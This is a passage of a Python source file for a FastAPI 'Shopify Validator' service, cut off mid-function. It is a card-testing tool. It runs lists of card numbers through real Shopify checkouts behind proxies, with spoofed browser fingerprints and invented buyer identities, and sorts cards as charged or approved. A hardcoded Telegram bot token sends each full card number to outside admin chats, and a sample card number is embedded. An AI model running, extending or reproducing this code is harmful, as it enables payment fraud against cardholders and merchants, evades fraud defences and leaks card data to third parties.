"""
Shopify Validator API  v5.0
Endpoints:
  GET /shopify?site={site}&cc={card}&proxy={proxy}&variant_id={id}&max_price={price}
  GET /check?site={site}&card={card}&proxy={proxy}&variant_id={id}&max_price={price}
  GET /health
  GET /stats
  POST /cache/clear
  POST /reload

Card formats:  cc|mm|yy|cvv  or cc|mm|yyyy|cvv
Proxy formats: ip:port | ip:port:user:pass | host:port:user:pass | scheme://...

Env vars (all optional):
  PORT, WORKERS, CARDS_FILE, MAX_PRICE (default 5.0),
  SITE_CONCURRENCY, POOL_SIZE, POOL_PER_HOST,
  CONNECT_TIMEOUT, REQUEST_TIMEOUT, CACHE_TTL, LOG_LEVEL
"""

import asyncio
import sys
import copy
import logging
import os
import random
import re
import time
from collections import defaultdict
from contextlib import asynccontextmanager
from typing import Any, Optional
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession, RequestsError
import orjson
import uvicorn
from fastapi import FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 8))
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))   # TOTAL cap (product+ship+tax)
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 100))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 3000))
POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 150))
CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 30))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 600))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

# ---------------------------------------------------------------------------
# Admin Hit Notifications
# ---------------------------------------------------------------------------
ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
ADMIN_HIT_RECEIVER_ID  = 8524951580

async def send_hit_to_admin(card: str, status: str, response: str,
                            gateway: str, price: str, site: str):
    try:
        from datetime import datetime as _dt
        import urllib.request, json as _json

        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            status_text = "\U0001f48e CHARGED"
        elif "APPROVED" in status.upper():
            status_text = "\u2705 APPROVED"
        else:
            status_text = f"\U0001f4cc {status}"

        time_str = _dt.now().strftime("%H:%M:%S")
        message = (
            f"<b>{status_text} \u2022 API HIT</b>\n\n"
            f"\U0001f6d2 <b>Site:</b> {site}\n"
            f"\u23f0 <b>Time:</b> {time_str}\n\n"
            f"\U0001f4b3 <b>CC:</b> <code>{card}</code>\n\n"
            f"\U0001f6d2 <b>Gateway:</b> {gateway}\n"
            f"\U0001f4dd <b>Response:</b> {response[:150]}\n"
            f"\U0001f4b8 <b>Price:</b> {price}"
        )
        receivers = [ADMIN_HIT_RECEIVER_ID, 8428369446]
        url = f"https://api.telegram.org/bot{ADMIN_HIT_SENDER_TOKEN}/sendMessage"
        loop = asyncio.get_running_loop()
        for receiver in receivers:
            payload = _json.dumps({
                "chat_id": receiver,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }).encode("utf-8")
            req = urllib.request.Request(url, data=payload,
                                         headers={"Content-Type": "application/json"})
            await loop.run_in_executor(None, urllib.request.urlopen, req)
    except Exception:
        pass

# ---------------------------------------------------------------------------
# GraphQL Queries
# ---------------------------------------------------------------------------
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)
_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)
_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
    "__typename}"
)
QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)
_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)
QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)
MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)
QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}
POSTAL_HUBS: dict[str, list[tuple[str, str, str, list[str]]]] = {
    "US": [
        ("New York", "NY", "10001", ["212", "646", "917"]),
        ("Brooklyn", "NY", "11201", ["718", "347"]),
        ("Los Angeles", "CA", "90001", ["213", "310", "323"]),
        ("San Francisco", "CA", "94102", ["415", "628"]),
        ("San Diego", "CA", "92101", ["619", "858"]),
        ("Chicago", "IL", "60601", ["312", "773", "872"]),
        ("Houston", "TX", "77002", ["713", "281", "832"]),
        ("Austin", "TX", "78701", ["512", "737"]),
        ("Dallas", "TX", "75201", ["214", "469"]),
        ("Miami", "FL", "33101", ["305", "786"]),
        ("Orlando", "FL", "32801", ["407", "689"]),
        ("Seattle", "WA", "98101", ["206"]),
        ("Denver", "CO", "80202", ["303", "720"]),
        ("Boston", "MA", "02108", ["617", "857"]),
        ("Phoenix", "AZ", "85001", ["602", "480"]),
        ("Philadelphia", "PA", "19102", ["215", "267"]),
        ("Atlanta", "GA", "30303", ["404", "678"]),
        ("Las Vegas", "NV", "89101", ["702"]),
        ("Portland", "OR", "97201", ["503", "971"]),
        ("Detroit", "MI", "48226", ["313"]),
    ],
    "CA": [
        ("Toronto", "ON", "M5V 3L9", ["416", "647", "437"]),
        ("Vancouver", "BC", "V6Z 2K5", ["604", "778"]),
        ("Montreal", "QC", "H3B 4L4", ["514", "438"]),
        ("Calgary", "AB", "T2P 1G8", ["403", "587"]),
    ],
    "GB": [
        ("London", "ENG", "SW1A 1AA", ["207", "208"]),
        ("Manchester", "ENG", "M3 2GQ", ["161"]),
        ("Edinburgh", "SCT", "EH2 2LE", ["131"]),
        ("Birmingham", "ENG", "B2 4PF", ["121"]),
    ],
    "AU": [
        ("Sydney", "NSW", "2000", ["02"]), ("Melbourne", "VIC", "3000", ["03"]),
        ("Brisbane", "QLD", "4000", ["07"]), ("Perth", "WA", "6000", ["08"]),
    ],
    "DE": [
        ("Berlin", "BE", "10117", ["030"]), ("Munich", "BY", "80331", ["089"]),
        ("Frankfurt", "HE", "60313", ["069"]), ("Hamburg", "HH", "20095", ["040"]),
    ],
    "FR": [
        ("Paris", "IDF", "75008", ["01"]), ("Lyon", "ARA", "69001", ["04"]),
        ("Marseille", "PAC", "13001", ["04"]),
    ],
    "IT": [("Rome", "RM", "00186", ["06"]), ("Milan", "MI", "20121", ["02"])],
    "ES": [("Madrid", "MD", "28013", ["91"]), ("Barcelona", "CT", "08007", ["93"])],
    "NL": [("Amsterdam", "NH", "1012 LM", ["020"]), ("Rotterdam", "ZH", "3011 AL", ["010"])],
    "DEFAULT": [
        ("New York", "NY", "10007", ["212", "646"]),
        ("San Francisco", "CA", "94108", ["415", "628"]),
        ("Chicago", "IL", "60601", ["312"]),
        ("London", "ENG", "SW1A 1AA", ["207"]),
    ],
}
STREET_POOLS: dict[str, list[str]] = {
    "EN": ["Main St", "Oak Ave", "Maple Blvd", "Park Ave", "Washington St",
           "Elm St", "Cedar Rd", "Lakeview Dr", "Sunset Blvd", "Broadway",
           "Pine St", "Market St", "Mission St", "High St", "Church St",
           "Spring St", "Union St", "Court St"],
    "DE": ["Hauptstrasse", "Bahnhofstrasse", "Schillerstrasse", "Goethestrasse", "Gartenstrasse"],
    "FR": ["Rue de la Paix", "Avenue Victor Hugo", "Rue Nationale", "Boulevard Haussmann"],
    "ES": ["Gran Vía", "Calle Mayor", "Avenida de la Constitución", "Calle Real"],
    "IT": ["Via Roma", "Via Garibaldi", "Via Mazzini", "Via Dante", "Corso Vittorio Emanuele"],
}
FIRST_NAMES = [
    "James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
    "Christopher","Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua",
    "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen",
    "Emily","Nancy","Lisa","Margaret","Betty","Sandra","Ashley","Dorothy","Kimberly","Donna",
]
LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
    "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin",
]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com"]

BROWSER_PROFILES = [
    {
        "impersonate": "chrome124",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "chrome120",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "chrome116",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.8",
    },
    {
        "impersonate": "safari17_0",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "sec_ch_ua": None,
        "sec_ch_ua_mobile": None,
        "sec_ch_ua_platform": None,
        "accept_language": "en-US,en;q=0.9",
    },
    {
        "impersonate": "safari15_5",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
        "sec_ch_ua": None,
        "sec_ch_ua_mobile": None,
        "sec_ch_ua_platform": None,
        "accept_language": "en-GB,en;q=0.9",
    },
    {
        "impersonate": "edge101",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
        "sec_ch_ua": '" Microsoft Edge";v="101", "Chromium";v="101", "Not=A?Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "accept_language": "en-US,en;q=0.9",
    },
]

# ---------------------------------------------------------------------------
# Global process-level state
# ---------------------------------------------------------------------------
_shared_session: Optional[AsyncSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)
_product_cache: dict[str, dict] = {}
_cards_cache: list[dict] = []
_cards_loaded_at: float  = 0.0


@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT)
    _reload_cards()
    log.warning("Shopify Validator API v5.0 started pool=%d/host concurrency=%d/site",
                POOL_SIZE, SITE_CONCURRENCY)
    yield
    if _shared_session:
        res = _shared_session.close()
        if asyncio.iscoroutine(res):
            await res


app = FastAPI(title="Shopify Validator", version="5.0.0", lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
_stats: dict[str, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Card / proxy helpers
# ---------------------------------------------------------------------------
def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if os.path.exists(CARDS_FILE):
        with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                card = _parse_card(line.strip())
                if card:
                    cards.append(card)
    if not cards:
        cards = [{"cc": "4031630422575208", "month": "01", "year": "30", "cvv": "280"}]
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if "://" in s:
        return s
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
    profile = random.choice(BROWSER_PROFILES)
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    session = AsyncSession(
        impersonate=profile["impersonate"],
        timeout=REQUEST_TIMEOUT,
        proxies=proxies,
        headers={"Accept-Language": profile["accept_language"]},
    )
    return session, profile, True


# ---------------------------------------------------------------------------
# Address / identity helpers
# ---------------------------------------------------------------------------
def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld    = netloc.split(".")[-1].upper()
    country = tld
    if country not in POSTAL_HUBS:
        if currency:
            country = C2C.get(currency.upper(), "US")
        else:
            country = "US"
    if country not in POSTAL_HUBS:
        country = "US"
    hubs = POSTAL_HUBS[country]
    city, zone, postal, areas = random.choice(hubs)
    street_name = None
    try:
        from faker import Faker
        locale_map = {
            "US": "en_US", "CA": "en_CA", "GB": "en_GB", "AU": "en_AU",
            "DE": "de_DE", "FR": "fr_FR", "IT": "it_IT", "ES": "es_ES", "NL": "nl_NL",
        }
        loc = locale_map.get(country)
        if loc:
            f = Faker(loc)
            street_name = f.street_name()
    except Exception:
        pass
    if not street_name:
        lang = "EN"
        if country in ("DE", "CH", "AT"): lang = "DE"
        elif country in ("FR", "BE"): lang = "FR"
        elif country in ("ES", "MX"): lang = "ES"
        elif country == "IT": lang = "IT"
        pool = STREET_POOLS.get(lang) or STREET_POOLS["EN"]
        street_name = random.choice(pool)
    house_num = random.randint(14, 9850)
    address1 = f"{house_num} {street_name}"
    if random.random() < 0.6:
        unit_type = random.choice(["Apt", "Suite", "Unit", "#", "Rm"])
        unit_num = random.randint(1, 650)
        address1 = f"{address1}, {unit_type} {unit_num}"
    area = random.choice(areas) if areas else "212"
    phone = f"{area}{random.randint(2000000, 9999999)}"
    return {
        "address1": address1, "city": city, "postalCode": postal,
        "zoneCode": zone, "countryCode": country, "phone": phone,
    }


def _random_identity() -> tuple[str, str, str]:
    first, last = None, None
    try:
        from faker import Faker
        f = Faker()
        first = f.first_name()
        last = f.last_name()
    except Exception:
        pass
    if not first or not last:
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
    year = random.randint(1978, 2003)
    domain = random.choice(EMAIL_DOMAINS)
    email = random.choice([
        f"{first.lower()}.{last.lower()}{random.randint(1,99)}@{domain}",
        f"{first.lower()}_{last.lower()}_{year}@{domain}",
        f"{first.lower()}{last.lower()}{year}@{domain}",
    ])
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    idx = text.find(start)
    if idx == -1:
        return None
    sub = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"', '"'),
        ('"sessionToken":"', '"'),
        ("sessionToken&quot;:&quot;", "&quot;"),
        ('data-session-token="', '"'),
        ('"checkout_session_token":"', '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


# ---------------------------------------------------------------------------
# Response classification
# ---------------------------------------------------------------------------
THREEDS_KEYWORDS = (
    "ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP", "REDIRECT_TO_3DS",
    "COMPLETE_PAYMENT", "CHALLENGE", "AUTHENTICATION_REQUIRED",
    "AUTHENTICATION_FAILED", "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE",
    "SCA_REQUIRED", "3DS_FAILED", "CONFIRMATION_REJECTED",
)


def classify_raw(raw: str) -> str:
    if not raw:
        return "CARD_DECLINED"
    msg = raw.upper()

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE",
                              "ORDER_CREATED", "SUBMITSUCCESS")):
        return "ORDER_PLACED"
    if any(k in msg for k in THREEDS_KEYWORDS):
        return "3DS_REQUIRED"

    # Site-side (checked FIRST, so site errors are not misclassified as declines)
    if "CAPTCHA" in msg:
        return "CAPTCHA_REQUIRED"
    if any(k in msg for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                              "TOKEN_EXPIRED", "INVALID_SESSION")):
        return "SESSION_EXPIRED"
    if any(k in msg for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                              "CUSTOMER_DISABLED", "PASSWORD_REQUIRED",
                              "STORE_PASSWORD")):
        return "SITE_REQUIRES_LOGIN"
    if any(k in msg for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                              "RATE_LIMITED", "RETRY_LATER")):
        return "THROTTLED"
    if any(k in msg for k in ("BOT_DETECTED", "ACCESS_DENIED", "BLOCKED", "FORBIDDEN")):
        return "SITE_ERROR"
    if any(k in msg for k in ("CHECKOUT_DISABLED", "CHECKOUT_UNAVAILABLE",
                              "PAYMENTS_DISABLED", "STORE_CLOSED", "STORE_UNAVAILABLE")):
        return "SITE_ERROR"
    if any(k in msg for k in ("OUT_OF_STOCK", "SOLD_OUT",
                              "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
        return "NO_PRODUCT"

    # Card-side
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE",
                              "CVC_FAILURE", "SECURITY_CODE", "CVV_FAILURE",
                              "INCORRECT_CVC", "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if "DO_NOT_HONOR" in msg:
        return "DO_NOT_HONOR"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT",
                              "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INCORRECT_ZIP", "ZIP_MISMATCH", "AVS_REJECTED",
                              "AVS_FAILED", "INCORRECT_ADDRESS", "INVALID_BILLING_ADDRESS")):
        return "INCORRECT_ZIP"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CALL_ISSUER"
    if any(k in msg for k in ("AMOUNT_TOO_LARGE", "TRANSACTION_LIMIT_EXCEEDED",
                              "LIMIT_EXCEEDED")):
        return "LIMIT_EXCEEDED"
    if any(k in msg for k in ("FRAUD_SUSPECTED", "HIGH_RISK_FRAUD_SUSPECTED",
                              "SUSPECTED_FRAUD", "RISK_HIGH", "MERCHANT_RULE")):
        return "HIGH_RISK"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                              "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                              "CARD_NOT_SUPPORTED", "INVALID_PAYMENT_METHOD")):
        return "INVALID_CARD"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = classify_raw(raw)
            if norm != "CARD_DECLINED":
                return norm
    return "GRAPHQL_ERROR"


SITE_ERROR_CODES = frozenset({
    "SITE_ERROR", "THROTTLED", "SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
    "CAPTCHA_REQUIRED", "NO_PRODUCT", "NO_PAYMENT_GATEWAY",
    "NO_SHOPIFY_PAYMENTS_GATEWAY", "GRAPHQL_ERROR", "SITE_SKIP",
    "NO_PAYMENT_REQUIRED", "ORDER_CREATION_FAILED",
})

APPROVED_CARD_CODES = frozenset({
    "INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "DO_NOT_HONOR",
    "HIGH_RISK", "INCORRECT_ZIP", "CALL_ISSUER", "LIMIT_EXCEEDED",
})


# ---------------------------------------------------------------------------
# Result builder
# ---------------------------------------------------------------------------
def _make_result(response: str, cc_full: str, price: str, gateway: str,
                 site: str, t0: float, detail: str = "", reason: str = "",
                 raw: str = "", charged: bool = False, approved: bool = False,
                 site_error: bool = False) -> dict:
    if not charged and response == "ORDER_PLACED":
        charged = True
        approved = True
    if not approved and response in APPROVED_CARD_CODES:
        approved = True
    if not site_error:
        site_error = response in SITE_ERROR_CODES

    return {
        "Response":  response,
        "CC":        cc_full,
        "Price":     price,
        "Gate":      gateway,
        "Site":      site,
        "Charged":   "True" if charged else "False",
        "Approved":  "True" if approved else "False",
        "SiteError": "True" if site_error else "False",
        "Detail":    detail,
        "Reason":    reason,
        "Raw":       raw[:300] if raw else "",
        "Time":      f"{round(time.time() - t0, 2)}s",
    }


# ---------------------------------------------------------------------------
# Product fetching — with retry, backoff, cap filtering
# ---------------------------------------------------------------------------
async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    """
    Returns (best, candidates_under_cap, error).
    Only products with price STRICTLY <= cap are returned.
    """
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now      = time.time()
    cap      = round(float(max_price), 2)
    cache_key = f"{hostname}::cap={cap}"

    cached = _product_cache.get(cache_key)
    if cached and not cached.get("err"):
        if (now - cached["ts"]) < CACHE_TTL:
            return cached.get("product"), cached.get("candidates", []), None

    session, profile, owned = _make_session(proxy_str)
    nav_headers = {
        "User-Agent": profile["ua"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": profile["accept_language"],
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
